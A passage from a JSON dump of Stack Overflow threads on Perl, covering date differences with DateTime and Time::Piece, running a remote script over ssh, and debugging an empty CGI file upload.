"https://www.gravatar.com/avatar/23e65c9f78e6c567b436bcf6dbfadf02?s=128&d=identicon&r=PG&f=1", "display_name": "Arkan", "link": "https://stackoverflow.com/users/6311434/arkan"}, "edited": false, "score": 0, "creation_date": 1462822852, "post_id": 37123202, "comment_id": 61789054, "body": "Thanks for the improvement Sebastian :)"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1462823704, "post_id": 37123202, "comment_id": 61789570, "body": "The questions ask for the difference between two dates, but a number of solution show the difference between today and another date. Which one do you want?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1462876162, "post_id": 37123202, "comment_id": 61810515, "body": "No need to reach for DateTime here. Time::Piece has been a standard part of the Perl distribution since 5.10 and will handle this fine."}], "answers": [{"comments": [{"owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "edited": false, "score": 0, "creation_date": 1462821810, "post_id": 37123668, "comment_id": 61788443, "body": "<code>-&gt;delta_days-&gt;days</code> doesn&#39;t return anything useful, see my sample."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "edited": false, "score": 1, "creation_date": 1462821889, "post_id": 37123668, "comment_id": 61788490, "body": "@Sebastian, I thought I needed <code>in_units</code>, but then I thought otherwise. Oops. Fixed."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1462822919, "last_edit_date": 1462822919, "creation_date": 1462821211, "answer_id": 37123668, "question_id": 37123202, "link": "https://stackoverflow.com/questions/37123202/datetime-pm-code-to-determine-days-between-dates/37123668#37123668", "title": "DateTime.pm code to determine days between dates", "body": "<p>You want to use <code>delta_days</code>.</p>\n\n<pre><code>sub dates_difference {\n   my ($year1, $month1, $day2, $year2, $mon2, $day2) = @_;\n   my $dt1 = DateTime-&gt;new( year =&gt; $year1, month =&gt; $month1, day =&gt; $day1, time_zone =&gt; 'floating' );\n   my $dt2 = DateTime-&gt;new( year =&gt; $year2, month =&gt; $month2, day =&gt; $day2, time_zone =&gt; 'floating' );\n   return $dt2-&gt;delta_days($dt1)-&gt;in_units('days');\n}\n</code></pre>\n\n<p>The following is more efficient:</p>\n\n<pre><code>sub dates_difference {\n   my ($year1, $month1, $day2, $year2, $mon2, $day2) = @_;\n   my $dt1 = DateTime-&gt;new( year =&gt; $year1, month =&gt; $month1, day =&gt; $day1, time_zone =&gt; 'floating' );\n   my $dt2 = DateTime-&gt;new( year =&gt; $year2, month =&gt; $month2, day =&gt; $day2, time_zone =&gt; 'floating' );\n   return abs( ( $dt2-&gt;local_rd_values )[0] - ( $dt1-&gt;local_rd_values )[0] );\n}\n</code></pre>\n\n<p>If you want the difference to be signed, use the following:</p>\n\n<pre><code>sub dates_difference {\n   my ($year1, $month1, $day2, $year2, $mon2, $day2) = @_;\n   my $dt1 = DateTime-&gt;new( year =&gt; $year1, month =&gt; $month1, day =&gt; $day1, time_zone =&gt; 'floating' );\n   my $dt2 = DateTime-&gt;new( year =&gt; $year2, month =&gt; $month2, day =&gt; $day2, time_zone =&gt; 'floating' );\n   return ( $dt2-&gt;local_rd_values )[0] - ( $dt1-&gt;local_rd_values )[0];\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 29, "user_id": 6311434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/23e65c9f78e6c567b436bcf6dbfadf02?s=128&d=identicon&r=PG&f=1", "display_name": "Arkan", "link": "https://stackoverflow.com/users/6311434/arkan"}, "edited": false, "score": 0, "creation_date": 1462821862, "post_id": 37123828, "comment_id": 61788474, "body": "Is Date::Calc part of Perl core whereas DateCalc.pm has to be installed via cpan?"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 29, "user_id": 6311434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/23e65c9f78e6c567b436bcf6dbfadf02?s=128&d=identicon&r=PG&f=1", "display_name": "Arkan", "link": "https://stackoverflow.com/users/6311434/arkan"}, "edited": false, "score": 0, "creation_date": 1462822450, "post_id": 37123828, "comment_id": 61788821, "body": "@Arkan No and no. Date::Calc isn&#39;t in core (although it is on CPAN); Date::DateCalc isn&#39;t on CPAN."}, {"owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "edited": false, "score": 0, "creation_date": 1462822881, "post_id": 37123828, "comment_id": 61789069, "body": "<a href=\"http://perldoc.perl.org/index-modules-D.html\" rel=\"nofollow noreferrer\">perldoc.perl.org/index-modules-D.html</a> states that neither <code>DateTime</code> nor <code>Date::Calc</code> are core modules. I just added a third option without any non-core modules, but it&#39;s not very accurate. I&#39;d prefer getting <code>Date::Calc</code>."}], "tags": [], "owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "is_accepted": false, "score": 0, "last_activity_date": 1462826624, "last_edit_date": 1462826624, "creation_date": 1462821750, "answer_id": 37123828, "question_id": 37123202, "link": "https://stackoverflow.com/questions/37123202/datetime-pm-code-to-determine-days-between-dates/37123828#37123828", "title": "DateTime.pm code to determine days between dates", "body": "<p>Assembling your code lines to an example:</p>\n\n<pre><code>my $dtcurrent = DateTime-&gt;new(\n    year  =&gt; 2016,\n    month =&gt; 5,\n    day   =&gt; 9,\n);\nmy $old = DateTime-&gt;new(\n    year  =&gt; 2016,\n    month =&gt; 1,\n    day   =&gt; 1,\n);\n</code></pre>\n\n<p>(I'm using a fixed <code>$dtcurrent</code> for easier explanation of the calculation results. Should be <code>$dtcurrent = DateTime-&gt;now</code> in production.)</p>\n\n<pre><code>my $distance = $old-&gt;delta_days($dtcurrent);\n</code></pre>\n\n<p><code>$distance</code> is a <code>DateTime::Duration</code> object which has different properties:</p>\n\n<pre><code>print $distance-&gt;years;\n0\n</code></pre>\n\n<p>No surprise: 2016 -> 2016 is 0 years difference.</p>\n\n<pre><code>print $distance-&gt;months;\n0\n\nprint $distance-&gt;days;\n3\n</code></pre>\n\n<p>What happend? The <code>DateTime</code> manual says:</p>\n\n<blockquote>\n  <p>The \"delta_days()\" method returns a duration which contains only days.</p>\n</blockquote>\n\n<p>Not what you expected. But try <code>-&gt;in_units</code>:</p>\n\n<pre><code>print $distance-&gt;in_units('days');\n129\n</code></pre>\n\n<p><strong>Alternate: Date::Calc</strong></p>\n\n<p>I'd prefer <code>Date::Calc</code> for this usage case:</p>\n\n<pre><code>use Date::Calc qw(Delta_Days Today);\nprint Delta_Days(Today(), 2016, 1, 1);\n-129\n</code></pre>\n\n<p>Swap <code>Today()</code> and the date to get a positive number. <code>Today()</code> may also be replaced by another <code>$year, $month, $day</code>.</p>\n\n<p><strong>Alternate: Timestamps</strong></p>\n\n<pre><code>use Time::Local qw( timegm ); # Core module\n\nmy ($year_now, $month_now, $day_now) = ( localtime(time) )[5,4,3];\n\nmy $ts     = timegm($year,     $month,     $day,     0, 0, 0);\nmy $ts_now = timegm($year_now, $month_now, $day_now, 0, 0, 0);\n\nmy $days = int(abs(($ts_now - $ts)) / (24*60*60));\n</code></pre>\n\n<p><code>timegm</code> does the opposite of <code>gmtime</code>: Convert date parts into a timestamp. Since all gmtime days have 24*60*60 seconds, we can find the number of days between two dates by finding the timestamps of those dates in gmt, calculating the difference, and dividing by 24*60*60. This is obviously very complicated and error prone.</p>\n"}, {"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1462822611, "post_id": 37123836, "comment_id": 61788906, "body": "The question asked about two arbitrary dates, not local-today and another."}], "tags": [], "owner": {"reputation": 29, "user_id": 6311434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/23e65c9f78e6c567b436bcf6dbfadf02?s=128&d=identicon&r=PG&f=1", "display_name": "Arkan", "link": "https://stackoverflow.com/users/6311434/arkan"}, "is_accepted": false, "score": 0, "last_activity_date": 1462822727, "last_edit_date": 1462822727, "creation_date": 1462821768, "answer_id": 37123836, "question_id": 37123202, "link": "https://stackoverflow.com/questions/37123202/datetime-pm-code-to-determine-days-between-dates/37123836#37123836", "title": "DateTime.pm code to determine days between dates", "body": "<p>Here's what I came up with that appears to work..</p>\n\n<pre><code>use DateTime;\n\nmy $dt_now = DateTime-&gt;now( time_zone =&gt; 'local' )-&gt;set_time_zone('floating');\n\nmy $dt1 = DateTime-&gt;new(\n   year      =&gt; $year,\n   month     =&gt; $month,\n   day       =&gt; $day,\n   time_zone =&gt; 'floating',\n);\n\nmy $days = $dt_now-&gt;delta_days($dt1)-&gt;in_units('days');\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1467563248, "last_edit_date": 1467563248, "creation_date": 1462822575, "answer_id": 37124050, "question_id": 37123202, "link": "https://stackoverflow.com/questions/37123202/datetime-pm-code-to-determine-days-between-dates/37124050#37124050", "title": "DateTime.pm code to determine days between dates", "body": "<p>Use the core <a href=\"https://metacpan.org/pod/Time::Piece\" rel=\"nofollow\"><code>Time::Piece</code></a> module. It's much lighter-weight than <code>DateTime</code> and does all that is necessary</p>\n\n<p>Here's some example code for you</p>\n\n<pre><code>use strict;\nuse warnings 'all';\nuse feature 'say';\n\nuse Time::Piece ();\n\nmy $x = dates_difference(2017, 1, 1, 2016, 5, 9);\n\nsay \"$x days until the New Year\";\n\n\nsub dates_difference {\n    my ($y, $m, $d, $cy, $cm, $cd) = @_;\n    my $date  = Time::Piece-&gt;strptime(\"$y $m $d\", '%Y %m %d');\n    my $cdate = Time::Piece-&gt;strptime(\"$cy $cm $cd\", '%Y %m %d');\n    ($date - $cdate)-&gt;days;\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>237 days until the New Year\n</code></pre>\n"}], "owner": {"reputation": 29, "user_id": 6311434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/23e65c9f78e6c567b436bcf6dbfadf02?s=128&d=identicon&r=PG&f=1", "display_name": "Arkan", "link": "https://stackoverflow.com/users/6311434/arkan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 226, "favorite_count": 0, "answer_count": 4, "score": 2, "last_activity_date": 1467563248, "creation_date": 1462819547, "last_edit_date": 1462822838, "question_id": 37123202, "link": "https://stackoverflow.com/questions/37123202/datetime-pm-code-to-determine-days-between-dates", "title": "DateTime.pm code to determine days between dates", "body": "<p>I have a function I'm trying to re-create using the DateTime module in Perl:</p>\n\n<pre><code>$x=dates_difference($year,$month,$day,$cyear,$curmon,$cmday)\n</code></pre>\n\n<p>given two dates, the current date/time in the format of: $cyear, $cmon, $cmday (year, month number, day of month number) and another date that will be earlier in the same format: $year, $month, $day, I want to return the number of days between the two dates.  I don't need it to be 100% precise, as long as it's +/- a day or two so time and timezones don't really matter.</p>\n\n<p>I've been reading through various examples and can't find anything very clear.</p>\n\n<p>I tried this:</p>\n\n<pre><code>$x = $dtcurrent-&gt;subtract_datetime_absolute($dt1);\n</code></pre>\n\n<p>and got an error <code>DateTime::Duration does not overload comparison. See the documentation on the compare() method for details.</code></p>\n\n<p>Example:</p>\n\n<pre><code>$x = $dtcurrent-&gt;delta_days($dt1);\nif ($x &gt; 30) ...\n</code></pre>\n\n<p>it does not appear to be returning a number I can use in a numeric comparison.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 20558, "user_id": 2864275, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/p2xKk.png?s=128&g=1", "display_name": "I\u0142ya Bursov", "link": "https://stackoverflow.com/users/2864275/i%c5%82ya-bursov"}, "edited": false, "score": 1, "creation_date": 1462819093, "post_id": 37123051, "comment_id": 61786963, "body": "<code>Second line call remote script</code> nope, it calls local script"}, {"owner": {"reputation": 20558, "user_id": 2864275, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/p2xKk.png?s=128&g=1", "display_name": "I\u0142ya Bursov", "link": "https://stackoverflow.com/users/2864275/i%c5%82ya-bursov"}, "edited": false, "score": 0, "creation_date": 1462819123, "post_id": 37123051, "comment_id": 61786981, "body": "you should pass name of the script to execute to ssh command"}, {"owner": {"reputation": 23, "user_id": 6205842, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0bc3d323c8e5db5a7554f6d6f365824a?s=128&d=identicon&r=PG&f=1", "display_name": "Yog", "link": "https://stackoverflow.com/users/6205842/yog"}, "reply_to_user": {"reputation": 20558, "user_id": 2864275, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/p2xKk.png?s=128&g=1", "display_name": "I\u0142ya Bursov", "link": "https://stackoverflow.com/users/2864275/i%c5%82ya-bursov"}, "edited": false, "score": 0, "creation_date": 1462819175, "post_id": 37123051, "comment_id": 61787002, "body": "Correct my code please"}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 1, "creation_date": 1462819225, "post_id": 37123051, "comment_id": 61787024, "body": "Try <code>system(&#39;ssh root@10.10.64.7 &#47;root&#47;abc.pl&#39;);</code>. That ssh&#39;s to the server and executes the script there in one go. (use <code>&#39;</code> instead of <code>&quot;</code> or escape the <code>@</code> (like <code>\\@</code>)."}, {"owner": {"reputation": 20558, "user_id": 2864275, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/p2xKk.png?s=128&g=1", "display_name": "I\u0142ya Bursov", "link": "https://stackoverflow.com/users/2864275/i%c5%82ya-bursov"}, "edited": false, "score": 2, "creation_date": 1462819227, "post_id": 37123051, "comment_id": 61787026, "body": "<code>system(&quot;ssh root@10.10.64.7 &#47;root&#47;abc.pl&quot;);</code>"}, {"owner": {"reputation": 23, "user_id": 6205842, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0bc3d323c8e5db5a7554f6d6f365824a?s=128&d=identicon&r=PG&f=1", "display_name": "Yog", "link": "https://stackoverflow.com/users/6205842/yog"}, "reply_to_user": {"reputation": 20558, "user_id": 2864275, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/p2xKk.png?s=128&g=1", "display_name": "I\u0142ya Bursov", "link": "https://stackoverflow.com/users/2864275/i%c5%82ya-bursov"}, "edited": false, "score": 0, "creation_date": 1462819513, "post_id": 37123051, "comment_id": 61787176, "body": "@Lashane It did not work for me...still same error"}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1462819829, "post_id": 37123051, "comment_id": 61787335, "body": "Then you have a problem with connecting to the server. That&#39;s not Perl related but system related (DNS, /etc/hosts, ...)"}, {"owner": {"reputation": 23, "user_id": 6205842, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0bc3d323c8e5db5a7554f6d6f365824a?s=128&d=identicon&r=PG&f=1", "display_name": "Yog", "link": "https://stackoverflow.com/users/6205842/yog"}, "edited": false, "score": 0, "creation_date": 1462820384, "post_id": 37123051, "comment_id": 61787653, "body": "@ Perl Dog It works!"}], "answers": [{"comments": [{"owner": {"reputation": 23, "user_id": 6205842, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0bc3d323c8e5db5a7554f6d6f365824a?s=128&d=identicon&r=PG&f=1", "display_name": "Yog", "link": "https://stackoverflow.com/users/6205842/yog"}, "edited": false, "score": 0, "creation_date": 1462829873, "post_id": 37124202, "comment_id": 61792570, "body": "alright thank you so much for this info..actually I am new to perl and not aware of that much.and this is will definitely very helpful to me."}], "tags": [], "owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "is_accepted": true, "score": 0, "last_activity_date": 1462823141, "creation_date": 1462823141, "answer_id": 37124202, "question_id": 37123051, "link": "https://stackoverflow.com/questions/37123051/how-to-gain-access-to-remote-server-from-perl-script-using-ssh-command/37124202#37124202", "title": "How to gain access to remote server from perl script using ssh command?", "body": "<p>There are some issues in your code.</p>\n\n<ul>\n<li>Always include <code>use strict;</code> and <code>use warnings;</code> in your scripts.</li>\n<li><p>Perl tries to interpolate the <code>@</code> in <code>system(\"ssh root@1.2.3.4\");</code>, \ni.e. it will try to somehow evaluate an array called <code>@1</code>\n(which doesn't exist).\n<code>use strict;</code> and <code>use warnings;</code> would have told you that:</p>\n\n<pre><code>Possible unintended interpolation of @1 in string at...\nssh: Could not resolve hostname root.2.3.4: Name or service not known.\n</code></pre>\n\n<p>From this you could have seen that actually the command <code>ssh root.2.3.4</code>\nwas issued (because Perl interpolated the <code>@1</code> away) which makes no sense.</p>\n\n<p>You have to either escape the <code>@</code> (by prepending a backslash, <code>\\@</code>)\nor use single quotes <code>'</code> instead of double quotes <code>\"</code> so that Perl\ndoesn't interpolate that <code>@1</code> array.</p></li>\n<li>You must not use three <code>system()</code> calls because they are executed\ncompletely unrelated to each other. The 1st one does (well, does not)\nan ssh to the remote machine and gets stuck there. The 2nd call tries\nto execute <code>/root/abc.pl</code> <strong><em>after</em></strong> the 1st call has finished,\ni.e. it does so on your local machine. The 3rd calls simply locally\nexecutes <code>exit</code> in a subshell which basically does nothing.</li>\n</ul>\n\n<p>Putting this together we get</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\nsystem('ssh root@1.2.3.4 /root/abc.pl');\n</code></pre>\n\n<p>This will ssh to 1.2.3.4 and execute the script <code>/root/abc.pl</code> there (in one go) and return after the script has finished.</p>\n"}], "owner": {"reputation": 23, "user_id": 6205842, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0bc3d323c8e5db5a7554f6d6f365824a?s=128&d=identicon&r=PG&f=1", "display_name": "Yog", "link": "https://stackoverflow.com/users/6205842/yog"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1393, "favorite_count": 1, "accepted_answer_id": 37124202, "answer_count": 1, "score": -1, "last_activity_date": 1462823141, "creation_date": 1462818988, "last_edit_date": 1462819296, "question_id": 37123051, "link": "https://stackoverflow.com/questions/37123051/how-to-gain-access-to-remote-server-from-perl-script-using-ssh-command", "title": "How to gain access to remote server from perl script using ssh command?", "body": "<p>I am trying to gain access of remote server from perl script using ssh command and then I need to call other script file.I am using here ssh public-private key authentication to gain access with out asking any password of remote server.By executing this script i am getting this error:</p>\n\n<p><strong>Name or service not known</strong></p>\n\n<p>Here is my code:</p>\n\n<p><code>#!/usr/bin/perl</code></p>\n\n<p><code>system(\"ssh root@1.2.3.4\");</code>\n<code>system(\"/root/abc.pl\");</code>\n<code>system(\"exit\");</code></p>\n\n<p>Second line call remote script file and third line logout from remote server and return local server.</p>\n\n<p>I am not sure this code is correct.\nCan anybody help to solve this problem?</p>\n"}, {"tags": ["perl", "upload"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462818656, "post_id": 37122762, "comment_id": 61786745, "body": "Can it be that your <code>$file_query</code> is just empty?  Check the (final) <code>$size</code> that you build while writing?"}, {"owner": {"reputation": 35, "user_id": 1681502, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/acea32033b417f3eb246063c45c30caa?s=128&d=identicon&r=PG", "display_name": "user1681502", "link": "https://stackoverflow.com/users/1681502/user1681502"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462820913, "post_id": 37122762, "comment_id": 61787953, "body": "Thank you for the reply.  I did try this, and it is showing 0 for the size.  However, prior to that happening, I tried the upload again, and it worked twice.  Then, it stopped working again.  It is very strange.  Any advice is greatly appreciated."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462821057, "post_id": 37122762, "comment_id": 61788027, "body": "That would mean that the problem is outside of this routine, no? The <code>$query</code> used to get <code>$file_query</code> is passed in and we don&#39;t know what&#39;s on that handle anyway."}, {"owner": {"reputation": 35, "user_id": 1681502, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/acea32033b417f3eb246063c45c30caa?s=128&d=identicon&r=PG", "display_name": "user1681502", "link": "https://stackoverflow.com/users/1681502/user1681502"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462824394, "post_id": 37122762, "comment_id": 61789911, "body": "OK, I tried to edit and paste in all of the code prior to the upload subscript.  So far, I have not been able to get the upload to work again."}, {"owner": {"reputation": 35, "user_id": 1681502, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/acea32033b417f3eb246063c45c30caa?s=128&d=identicon&r=PG", "display_name": "user1681502", "link": "https://stackoverflow.com/users/1681502/user1681502"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462824456, "post_id": 37122762, "comment_id": 61789937, "body": "Just FYI, the variable values have been changed on the working version.  What you see here are the default variables from the original script I used."}], "answers": [{"comments": [{"owner": {"reputation": 35, "user_id": 1681502, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/acea32033b417f3eb246063c45c30caa?s=128&d=identicon&r=PG", "display_name": "user1681502", "link": "https://stackoverflow.com/users/1681502/user1681502"}, "edited": false, "score": 0, "creation_date": 1462829085, "post_id": 37125406, "comment_id": 61792268, "body": "OK.  Well, thank you for your help and for looking at it.  I&#39;ll just keep working with it to see what I can do."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 35, "user_id": 1681502, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/acea32033b417f3eb246063c45c30caa?s=128&d=identicon&r=PG", "display_name": "user1681502", "link": "https://stackoverflow.com/users/1681502/user1681502"}, "edited": false, "score": 0, "creation_date": 1462858827, "post_id": 37125406, "comment_id": 61800121, "body": "@user1681502  I&#39;ve added and reworded text, a thing or two to try, and one <b>specific diagnostic step</b> that has to yield some insight into where the problem is.  Please see <b>Update</b> places.  Please let me know what you find out."}, {"owner": {"reputation": 35, "user_id": 1681502, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/acea32033b417f3eb246063c45c30caa?s=128&d=identicon&r=PG", "display_name": "user1681502", "link": "https://stackoverflow.com/users/1681502/user1681502"}, "edited": false, "score": 0, "creation_date": 1466727918, "post_id": 37125406, "comment_id": 63451643, "body": "Sorry to take so long on a response, but I was finally able to try your suggestion of checking the temporary file, and it seems to be empty as well.  Any ideas on where to go from here?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 35, "user_id": 1681502, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/acea32033b417f3eb246063c45c30caa?s=128&d=identicon&r=PG", "display_name": "user1681502", "link": "https://stackoverflow.com/users/1681502/user1681502"}, "edited": false, "score": 0, "creation_date": 1467316441, "post_id": 37125406, "comment_id": 63695373, "body": "@user1681502  Thank you very much for the attribution. I&#39;ll have to read up a little on <i>all</i> that happens with a CGI scipt, since that file just isn&#39;t making it up there and I can&#39;t think of what part could be failing now.  Were there any changes in the system that you know about? With servers? With the OS? With rules? I don&#39;t see anything wrong with the code, and you (later) posted yet another version of it, which also looks fine. So I&#39;d look elsewhere in the process."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 35, "user_id": 1681502, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/acea32033b417f3eb246063c45c30caa?s=128&d=identicon&r=PG", "display_name": "user1681502", "link": "https://stackoverflow.com/users/1681502/user1681502"}, "edited": false, "score": 0, "creation_date": 1467352296, "post_id": 37125406, "comment_id": 63706234, "body": "@user1681502  Something just came up, so let me pass it on to you.  1) What is the userid? If it&#39;s  <code>web</code> or <code>nobody</code> write-permissions are restricted, with good reasons. Then you can create a world-writable file in <code>&#47;tmp</code> or so. Or, you can configure the server to run with your userid, then it can write in your space. (2) Permissions, on files and directories, are they what they should be and do they agree with each other. (3) A wild guess -- SELinux settings?  Some of these may not apply but I can&#39;t check now, please consider.  ...  oh, no you <i>can</i> create_ a file. Still worth checking?"}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 1, "last_activity_date": 1462859079, "last_edit_date": 1462859079, "creation_date": 1462827787, "answer_id": 37125406, "question_id": 37122762, "link": "https://stackoverflow.com/questions/37122762/perl-not-writing-to-buffer/37125406#37125406", "title": "Perl Not Writing to Buffer", "body": "<p>It appears clear that the problem lies with the file being uploaded, outside of (before) the shown code.  The code prints to <code>$file_name</code> obtained by cleaning up <code>$file_query</code>, which is pulled from <code>$query</code>. This is the CGI object itself that is passed into the sub. I cannot see anything in the code that would mess with the data to be used to write the <code>$file_name</code>.  </p>\n\n<p>This would imply that the data for which <code>$file_query</code> is a filehandle is (sometimes) missing, so when you copy it via your <code>read()</code> loop to <code>$file_name</code> you get nothing.</p>\n\n<p>The one thing I can recommend is to test for the size of the (temp) file that is being copied into <code>$file_name</code>. <strong>See Update below for how to do that.</strong> Any 